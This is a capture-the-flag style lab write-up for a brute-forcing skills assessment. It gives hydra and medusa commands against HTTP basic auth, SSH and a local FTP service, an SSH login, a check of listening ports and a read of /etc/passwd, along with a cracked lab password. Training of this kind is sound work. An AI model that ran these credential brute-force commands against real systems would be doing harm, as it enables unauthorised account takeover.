# Skills Assessment

## Skills Assessment Part 1

The first part of the skills assessment will require you to brute-force the the target instance. Successfully finding the correct login will provide you with the username you will need to start Skills Assessment Part 2.

You might find the following wordlists helpful in this engagement: [usernames.txt](https://github.com/danielmiessler/SecLists/blob/master/Usernames/top-usernames-shortlist.txt) and [passwords.txt](https://github.com/danielmiessler/SecLists/blob/master/Passwords/Common-Credentials/2023-200_most_used_passwords.txt)

***

* What is the password for the basic auth login?

```
hydra -L top-users.txt -P 2023-200_most_used_passwords.txt -s 40526 94.237.50.221 http-get /
```

* After successfully brute forcing the login, what is the username you have been given for the next part of the skills assessment?

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

***

## Skills Assessment Part 2

This is the second part of the skills assessment. `YOU NEED TO COMPLETE THE FIRST PART BEFORE STARTING THIS`. Use the username you were given when you completed part 1 of the skills assessment to brute force the login on the target instance.

***

* What is the username of the ftp user you find via brute-forcing?

First u can se with nmap, it machine have open the por ssh 22, so, brute force -->

```
medusa -h 94.237.121.185 -n 38159 -u satwossh -P 2023-200_most_used_passwords.txt -M ssh -t 3
```

Then witht the crendentials, login and see internal ports -->

```
ssh satwossh@94.237.59.174 -p 49486
```

```
netstat -tulpn | grep LISTEN
 
[redacted]
tcp        0      0 0.0.0.0:22           0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::21                :::*                    LISTEN      -                   
tcp6       0      0 :::22                :::*                    LISTEN      -  
```

So FTP is also running. I checked the content of `/etc/passwd` to know the ftp user which is `thomas`.

* Note: I could have used Username anarchy to identify the ftp username

Inside of the machine I found a `.txt` called `IncidentReport.txt`:

```
System Logs - Security Report Date: 2024-09-06 Upon reviewing recent FTP activity, we have identified suspicious behavior linked to a specific user. The user **Thomas Smith** has been regularly uploading files to the server during unusual hours and has bypassed multiple security protocols. This activity requires immediate investigation. All logs point towards Thomas Smith being the FTP user responsible for recent questionable transfers. We advise closely monitoring this user’s actions and reviewing any files uploaded to the FTP server. Security Operations Team
```

Then I performed a brute force attack to the ftp:

```
medusa -h 127.0.0.1 -u thomas -P passwords.txt -M ftp -t 5 [redacted]ACCOUNT FOUND: [ftp] Host: 127.0.0.1 User: thomas Password: chocolate! [SUCCESS]
```

* What is the flag contained within flag.txt
